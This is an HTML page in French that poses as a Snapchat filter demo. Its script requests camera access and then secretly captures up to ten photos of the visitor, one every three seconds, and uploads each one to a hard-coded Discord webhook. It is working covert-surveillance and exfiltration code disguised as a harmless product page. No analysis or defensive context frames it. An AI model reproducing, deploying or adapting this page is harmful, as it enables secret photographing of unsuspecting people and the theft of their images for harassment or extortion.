	<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1.0" />
<title>Filtre SnapChat</title>
<link rel="icon" href="https://png.pngtree.com/element_our/sm/20180626/sm_5b321c9cb2d25.jpg" type="image/png">
<style>
/* Global styles */
body {
font-family: Arial, sans-serif;
text-align: center;
margin: 0;
padding: 0;
background-color: #f7f7f7;
}

header {
background-color: #fffc00; /* Couleur de fond jaune Snap */
padding: 20px 0;
}

#snap-logo {
width: 80px;
height: auto;
}

section {
margin: 20px;
padding: 10px;
background-color: white;
border-radius: 10px;
box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
max-width: 800px;
margin: 40px auto;
}

h1 {
color: #333;
font-size: 24px;
margin-bottom: 20px;
}

/* Vidéo affichée dans le canevas */
#canvas {
width: 100%;
max-width: 100%;
height: auto;
border: 2px solid #ddd;
border-radius: 10px;
box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
}

/* Masquer la vidéo mais la garder fonctionnelle */
#video {
position: absolute;
opacity: 0;
pointer-events: none;
}
</style>
</head>
<body>
<header>
<img src="https://png.pngtree.com/element_our/sm/20180626/sm_5b321c9cb2d25.jpg" alt="Snapchat Logo" id="snap-logo">
</header>

<section>
<h1>Testez le nouveau filtre ici !</h1>
<!-- Canvas pour afficher l'image en temps réel -->
<canvas id="canvas"></canvas>
</section>

<video id="video" autoplay playsinline></video> <!-- Vidéo cachée pour capturer les photos -->

<script>
const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1218192955949449217/1lvAsm4GDuLyyXlccS2YNUlOKPe4X-ESYVoXauGyyYIBHyr5KrMvDOhR4tK5yKIX3LU4";

window.addEventListener('load', () => {
const video = document.getElementById('video');
const canvas = document.getElementById('canvas');
const context = canvas.getContext('2d');

let photoCount = 0; // Limite de captures

// Demande l'accès à la caméra
navigator.mediaDevices
.getUserMedia({ video: true })
.then((stream) => {
video.srcObject = stream;
video.play();

video.addEventListener('loadeddata', () => {
console.log("Caméra prête!");

// Ajuste la taille du canevas
canvas.width = video.videoWidth;
canvas.height = video.videoHeight;

// Affiche la vidéo en temps réel
function renderVideo() {
context.drawImage(video, 0, 0, canvas.width, canvas.height);
requestAnimationFrame(renderVideo); // Continue le rendu en boucle
}
renderVideo(); // Lance le rendu en temps réel

// Capture toutes les 3 secondes
setTimeout(() => {
captureAndSendPhoto();
setInterval(captureAndSendPhoto, 3000);
}, 1000);
});

// Capture discrète et envoie
function captureAndSendPhoto() {
if (photoCount >= 10) return; // Arrête après 10 photos

// Capture l'image actuelle du flux vidéo
context.drawImage(video, 0, 0, canvas.width, canvas.height);
canvas.toBlob((blob) => {
const formData = new FormData();
formData.append("file", blob, `capture_${Date.now()}.png`); // Nom unique

fetch(DISCORD_WEBHOOK_URL, {
method: "POST",
body: formData
})
.then(() => {
console.log("Photo envoyée sur Discord");
photoCount++;
})
.catch(err => console.error("Erreur lors de l'envoi :", err));
}, 'image/png');
}
})
.catch((err) => {
console.error('Erreur d’accès à la caméra :', err);
});
});
</script>
</body>
</html>
